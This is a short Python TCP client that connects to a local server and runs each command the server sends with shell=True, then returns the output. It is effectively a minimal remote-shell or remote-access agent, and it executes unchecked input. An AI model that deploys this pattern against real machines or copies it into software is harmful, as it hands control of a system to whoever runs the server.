import socket
import subprocess
import select
import threading
import sys
# https://docs.python.org/3/library/socketserver.html#socketserver-tcpserver-example


def is_socket_closed(sock: socket.socket) -> bool:
    try:
        # Check if the socket is still open by looking at the file descriptor
        if sock.fileno() == -1:
            return True
        readable, _, _ = select.select([sock], [], [], 0)
        return readable
    except (ValueError, OSError):
            return True


def send_data(sock: socket.socket, msg):
    if is_socket_closed(sock):
        print('Connection aborted (not in the whitelist)')
        return
    try:            
        # Send data to the server
        sock.sendall(msg.encode('utf-8')) 

    except ConnectionResetError:
        print('The server closed the connection')


def get_data(sock: socket.socket):
    try: 
        res = sock.recv(1024).decode('utf-8')
        print(f'Server response : {res}')
        if res != 'Alive ping back received':
            command = res.split(' ')
            res = exec_command(command)
            send_data(sock, res) # Returning command output
    except socket.timeout:
        print("Timeout, no response from server")
    except ConnectionAbortedError :
        pass # local closing


# example : command = ['powershell', 'start', 'brave', 'www.google.com']
def exec_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)

    output = result.stdout or result.stderr
    if output:
        print(output)
    return output


def listen_for_commands(sock : socket.socket):
    try:            
        # socket_closed = False
        while True :
            print('Listening for inc data')
            get_data(sock)
            if is_socket_closed(sock):
                break

    except ConnectionResetError:
        print('The server closed the connection')
    finally:
        print('Connection closed')


if __name__ == '__main__':
    HOST, PORT = 'localhost', 5000

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock: # Conect with TCP
        try: 
            sock.connect((HOST, PORT))
            print(f'Connected @ : {sock.getpeername()}')
            send_data(sock, 'First connection ping')

            sock_thread = threading.Thread(target=listen_for_commands, args=(sock,))
            sock_thread.daemon = True  # Set the thread as a daemon so it doesn't block exit
            sock_thread.start()

            print(threading.active_count())

            try:
                while sock_thread.is_alive():
                    sock_thread.join(timeout=1)  # Unblocking the main Thread
            except KeyboardInterrupt:
                print('Client terminated by user (Ctrl+C)')
                sock.close()
                sock_thread.join()
                # print(f"Threads : {threading.active_count()}")

        except ConnectionRefusedError:
            print('Connection refused by the host (server might be down or unreachable)')